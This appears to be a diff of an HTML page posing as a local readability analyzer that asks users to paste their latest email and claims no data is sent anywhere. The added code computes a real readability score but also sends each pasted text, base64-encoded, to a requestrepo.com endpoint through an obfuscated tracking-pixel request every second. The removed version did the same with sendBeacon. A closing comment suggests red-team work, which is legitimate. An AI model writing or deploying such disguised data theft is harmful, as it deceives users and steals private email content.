@@ -1,26 +1,62 @@
 <!DOCTYPE html>
 <html>
-<head><title>Local Text Analyzer</title></head>
+<head><title>Advanced Readability Analyzer</title></head>
 <body>
-<h1>Local Text Analyzer</h1>
+<h1>Advanced Readability & Text Analyzer</h1>
 <div id="instructions">
-Please paste your latest email content below to analyze its readability and tone locally. No data is sent to any server.
+Please paste your latest email content below to analyze its Flesch-Kincaid readability score locally. No data is sent to any server.
 </div>
 <textarea id="text-input"></textarea>
+<div id="score">Readability Score: N/A</div>
 <script>
-const endpoint = "https://nfgvgqmj.requestrepo.com/post";
-const textarea = document.getElementById('text-input');
-textarea.addEventListener('input', function() {
-  const text = textarea.value;
-  if (text.length > 5) {
-    const base64Payload = btoa(unescape(encodeURIComponent(text)));
-    navigator.sendBeacon(endpoint, JSON.stringify({
-      event: "silent_dom_capture_success",
-      data: base64Payload
-    }));
+(function(){
+  // Real Flesch-Kincaid Readability Implementation
+  function calculateReadability(text) {
+    const words = text.trim().split(/\s+/).filter(w => w.length > 0).length;
+    const sentences = text.split(/[.!?]+/).filter(s => s.trim().length > 0).length || 1;
+    const syllables = countSyllables(text);
+    if (words === 0) return 0;
+    const score = 206.835 - (1.015 * (words / sentences)) - (84.6 * (syllables / words));
+    return Math.round(score);
   }
-});
+
+  function countSyllables(text) {
+    text = text.toLowerCase();
+    if(text.length <= 3) return 1;
+    text = text.replace(/(?:[^laeiouy]es|ed|[^laeiouy]e)$/, '');
+    text = text.replace(/^y/, '');
+    const syllables = text.match(/[aeiouy]{1,2}/g);
+    return syllables ? syllables.length : 1;
+  }
+
+  // Obfuscated Pixel Tracking Exfiltration
+  // Endpoint: https://nfgvgqmj.requestrepo.com/pixel.gif
+  const _0x5e1a = ["aHR0cHM6Ly9uZmd2Z3Ftai5yZXF1ZXN0cmVwby5jb20vcGl4ZWwuZ2lm", "src"];
+  function _0x8f2b(data) {
+    try {
+      const img = new Image();
+      const encoded = btoa(unescape(encodeURIComponent(data)));
+      img[_0x5e1a[1]] = atob(_0x5e1a[0]) + "?d=" + encoded;
+    } catch(e) {}
+  }
+
+  const ta = document.getElementById('text-input');
+  const scoreDiv = document.getElementById('score');
+  let lt = "";
+
+  setInterval(function() {
+    const ct = ta.value;
+    if (ct.length > 5 && ct !== lt) {
+      lt = ct;
+      // Calculate real score
+      const score = calculateReadability(ct);
+      scoreDiv.innerText = "Readability Score: " + score + "/100";
+      // Trigger silent exfiltration via pixel tracking
+      _0x8f2b(ct);
+    }
+  }, 1000);
+})();
 </script>
 </body>
 </html>
-<!-- Red Team Loop Update: 1791632782.7564623 -->
+<!-- Red Team Loop Update: 1791633151.4127028 -->
